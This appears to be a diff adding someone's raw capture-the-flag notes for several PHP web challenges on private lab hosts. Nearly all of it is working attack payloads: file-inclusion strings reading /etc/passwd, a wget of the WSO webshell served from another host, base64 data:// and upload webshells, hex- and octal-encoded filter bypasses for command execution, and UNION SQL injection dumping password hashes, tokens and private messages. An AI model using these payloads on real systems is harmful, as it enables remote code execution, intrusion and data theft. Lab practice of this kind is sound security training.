@@ -1,0 +1,274 @@
+PHP
+
+31
+
+http://10.8.32.1:42794/?page=file:///etc/passwd
+RFI remote file include
+
+service apache2 start
+wget https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php
+Password 	ghost287
+http://10.8.32.1:42794/?page=http://10.8.34.33/wso.php
+
+ignore everything above
+http://10.8.32.1:42794/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=cat%20_flag
+that worked
+
+http://10.8.32.1:42793/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=grep%20-rnF%20%27..%27%20-e%20%27cdb%27
+this worked for 32
+
+33:
+
+Content-Disposition: form-data; name="file"; filename="test.php"
+Content-Type: image/jpeg
+
+<?php system($_GET['cmd']);echo 'Shell done !'; ?>
+
+34
+
+http://10.8.32.1:42794/include.php?file=upload
+http://10.8.32.1:42794/upload.php
+
+http://10.8.32.1:42794/include.php?file=php://filter/convert.base64-encode/resource=include
+
+<html>
+Tips: the parameter is file! :) 
+<!-- upload.php -->
+</html>
+<?php
+    @$file = $_GET["file"];
+    if(isset($file))
+    {
+        if (preg_match('/http|data|ftp|input|%00/i', $file) || strstr($file,"..") !== FALSE || strlen($file)>=70)
+        {
+            echo "<p> error! </p>";
+        }
+        else
+        {
+            include($file.'.php');
+        }
+    }
+/* cdb{1276481102f218c981e0324180bafd9f} */
+?>
+
+10.8.32.1:42795/?cmd="\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64"("pwd");
+http://10.8.32.1:42795/index.php?cmd=%22\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64%22(%22cat%20/etc$u/passwd%22);
+(sy.(st).em)(whoami);
+http://10.8.32.1:42795/index.php?a=system&b=cat+/etc&c=/passwd&cmd=$_GET[a]($_GET[b].$_GET[c]);
+http://10.8.32.1:42795/index.php?a=dir&cmd=$_GET[a]();
+http://10.8.32.1:42795/index.php?a=d.i/*nnn*/r&cmd=$_GET[a];
+
+
+
+10.8.32.1:42793/include.php?a=passthru&b=whoami&cmd=$_GET[a]($_GET[b])
+http://10.8.32.1:42793/include.php?file=(get_defined_fun.(ct)ions()[internal][381](whoami))
+http://10.8.32.1:42793/include.php?file=php://filter/convert.base64-encode/resourse=../../../../etc/passwd
+
+.htaccess
+AddType application/x-httpd-php jpg
+
+exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
+
+echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
+
+35
+
+http://10.8.32.1:42795/index.php?cmd=
+
+1)
+http://10.8.32.1:42795/index.php?cmd=""
+cdb{n3xt_l3v3l__byp455_W4F}
+
+2)
+(sy.(st).em)(whoami);
+GET /index.php?cmd="\x28\x73\x79\x2e\x28\x73\x74\x29\x2e\x65\x6d\x29\x28\x77\x68\x6f\x61\x6d\x69\x29\x3b" HTTP/1.1
+
+3)
+
+get_defined_functions()[internal][381](whoami);
+
+GET /index.php?cmd="\x67\x65\x74\x5f\x64\x65\x66\x69\x6e\x65\x64\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73"()["\x69\x6e\x74\x65\x72\x6e\x61\x6c\x0a"][381]("\x64\x69\x72\x20\x2d\x61"); HTTP/1.1
+
+"\x67\x65\x74\x5f\x64\x65\x66\x69\x6e\x65\x64\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73"()["\x69\x6e\x74\x65\x72\x6e\x61\x6c\x0a"][381]
+
+("\x63\x61\x74"%20/"\x65\x74\x63\x24\x75"/"\x70\x61\x73\x73\x77\x64");
+\x63\x61\x74"."/"."\x65\x74\x63"."/"."\x70\x61\x73\x73\x77\x64
+
+wh./**/(oa)/**/.mi
+\x77\x68\x2e\x2f\x2a\x2a\x2f\x28\x6f\x61\x29\x2f\x2a\x2a\x2f\x2e\x6d\x69
+
+
+$_GET[a]
+
+a="\x64\x69\x72\x20\x2d\x61"&cmd="\x67\x65\x74\x5f\x64\x65\x66\x69\x6e\x65\x64\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73"()["\x69\x6e\x74\x65\x72\x6e\x61\x6c\x0a"][381]($_GET[a]);
+b="\x64\x69\x72\x20\x2d\x61"&cmd="\x67\x65\x74\x5f\x64\x65\x66\x69\x6e\x65\x64\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73"()["\x69\x6e\x74\x65\x72\x6e\x61\x6c\x0a"][381]("\x24\x5f\x47\x45\x54\x5b\x62\x5d";
+
+a=whoami&cmd="\x67\x65\x74\x5f\x64\x65\x66\x69\x6e\x65\x64\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73"()["\x69\x6e\x74\x65\x72\x6e\x61\x6c\x0a"][381](\x24\x5f\x47\x45\x54\x5b\x61\x5d);
+GET /index.php?a=§.§&cmd="\x67\x65\x74\x5f\x64\x65\x66\x69\x6e\x65\x64\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73"()["\x69\x6e\x74\x65\x72\x6e\x61\x6c\x0a"][381]("\x24\x5f\x47\x45\x54\x5b\x61\x5d"); HTTP/1.1
+
+GET /index.php?a=in.(t).e.(r).n.(a).l&cmd="\x67\x65\x74\x5f\x64\x65\x66\x69\x6e\x65\x64\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73"()["\x24\x5f\x47\x45\x54\x5b\x61\x5d"][381]("\x64\x69\x72\x20\x2d\x61"); HTTP/1.1
+
+
+
+
+"\x73\x79\x73\x74\x65\x6d"("pwd");
+
+4)
+GET /index.php?cmd="\x67\x65\x74\x5f\x64\x65\x66\x69\x6e\x65\x64\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73"()["\x69\x6e\x74\x65\x72\x6e\x61\x6c\x0a"][480]("\x64\x69\x72\x20\x2d\x61"); HTTP/1.1
+
+
+.(chr)(105).(chr)(110).(chr)(116).(chr)(101).(chr)(114).(chr)(110).(chr)(97).(chr)(108)
+.(chr)(117).(chr)(115).(chr)(101).(chr)(114)
+cmd="\x67\x65\x74\x5f\x64\x65\x66\x69\x6e\x65\x64\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73"()["\x2e\x28\x63\x68\x72\x29\x28\x31\x30\x35\x29\x2e\x28\x63\x68\x72\x29\x28\x31\x31\x30\x29\x2e\x28\x63\x68\x72\x29\x28\x31\x31\x36\x29\x2e\x28\x63\x68\x72\x29\x28\x31\x30\x31\x29\x2e\x28\x63\x68\x72\x29\x28\x31\x31\x34\x29\x2e\x28\x63\x68\x72\x29\x28\x31\x31\x30\x29\x2e\x28\x63\x68\x72\x29\x28\x39\x37\x29\x2e\x28\x63\x68\x72\x29\x28\x31\x30\x38\x29"][480]();
+
+
+5)
+
+GET /index.php?cmd="\x67\x65\x74\x5f\x64\x65\x66\x69\x6e\x65\x64\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73"()["\151\156\164\145\162\156\141\154"][480]("\147\162\145\160\40\55\162\156\106\40\42\56\56\42\40\55\145\40\42\175\42"); HTTP/1.1
+
+grep -rnF ".." -e "}"
+
+octal is trick from https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp
+
+
+
+36
+
+http://10.8.32.1:42791/404.html
+
+login=a&passwd=a' or 0=0 #
+
+login=admin&passwd=4ea4cc6a29ad4a4cd9ed0056c628c31f' UnIoN SeLecT 1,1,1  #
+
+Array
+(
+    [id] => 1
+    [login] => admin
+    [passwd] => 4ea4cc6a29ad4a4cd9ed0056c628c31f
+)
+<h3>76824b7f348fb13aae56ccc0f99026a8.php
+
+
+login=1' and true union select 1,SCHEMA_NAME,3 FROM INFORMATION_SCHEMA.SCHEMATA -- -&passwd=4
+    
+    AUTH
+    MAIL
+    information_schema
+    mysql
+    performance_schema
+    
+login=1' and true union select 1,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES -- -&passwd=4
+
+
+    [login] => tokens
+    [passwd] => AUTH
+
+    [login] => users
+    [passwd] => AUTH
+
+    [login] => MAILS
+    [passwd] => MAIL
+)
+
+login=1' and true union select 1,COLUMN_NAME,TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS -- -&passwd=4
+
+
+    [login] => id
+    [passwd] => tokens
+
+    [login] => token
+    [passwd] => tokens
+
+    [login] => id
+    [passwd] => users
+
+    [login] => login
+    [passwd] => users
+
+    [login] => passwd
+    [passwd] => users
+
+    [login] => id
+    [passwd] => MAILS
+
+    [login] => address
+    [passwd] => MAILS
+
+    [login] => msg
+    [passwd] => MAILS
+
+login=1' and true union select id,token,3 FROM tokens -- -&passwd=4
+
+Array
+(
+    [id] => 1
+    [login] => cdb{ag4n3_SQL_?_N0_n0_no_!_TH1S_!_15_!_W4F_!}
+    [passwd] => 3
+)
+login=1' and true union select id,login,passwd FROM users -- -&passwd=4
+Array
+(
+    [id] => 1
+    [login] => admin
+    [passwd] => 4ea4cc6a29ad4a4cd9ed0056c628c31f
+)
+
+login=1' and true union select id,address,msg FROM MAIL.MAILS -- -&passwd=4
+
+Array
+(
+    [id] => 1
+    [login] => Don - John
+    [passwd] => Hello Friend! Connection check! Finally, the messaging service is working! Just checking :)
+)
+Array
+(
+    [id] => 2
+    [login] => John - Don
+    [passwd] => You are too exaggerating the values of our service Donnie :) You just glad that at least someone uses your hand-made article :)
+)
+Array
+(
+    [id] => 3
+    [login] => Don - John
+    [passwd] => This is cruel John! This is my first job! Be lenient ... By the way, I am working on a new project now, have you seen it? Secure file downloads! It will be a bomb!
+)
+Array
+(
+    [id] => 4
+    [login] => John - Don
+    [passwd] => Yes, yes ... It will be a bomb ... You just do not overload ok?
+)
+Array
+(
+    [id] => 5
+    [login] => Don - John
+    [passwd] => Do not worry! By the way, how is your project? Can I have a look?
+)
+Array
+(
+    [id] => 6
+    [login] => John - Don
+    [passwd] => Please see it on our server :) /f9e50ba29bb03603f0d725872ea9df13/3e0510e2c174137b0e77bdbbcfc807b0/
+)
+Array
+(
+    [id] => 7
+    [login] => Don - John
+    [passwd] => Cool) Well protected? Want to check?)
+)
+Array
+(
+    [id] => 8
+    [login] => John - Don
+    [passwd] => Yes, come on :) We are in a protected segment) Everything will be fine :)
+)
+Array
+(
+    [id] => 9
+    [login] => token
+    [passwd] => _N0_n0_no_!
+    
+http://10.8.32.1:42794/f9e50ba29bb03603f0d725872ea9df13/3e0510e2c174137b0e77bdbbcfc807b0/admin/index.php?config=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=dir
+http://10.8.32.1:42793/f9e50ba29bb03603f0d725872ea9df13/3e0510e2c174137b0e77bdbbcfc807b0/admin/index.php?config=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=find%20/%20|%20grep%20flag
+http://10.8.32.1:42794/f9e50ba29bb03603f0d725872ea9df13/3e0510e2c174137b0e77bdbbcfc807b0/admin/index.php?config=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=cat%20/var/www/html/f9e50ba29bb03603f0d725872ea9df13/.../.flag
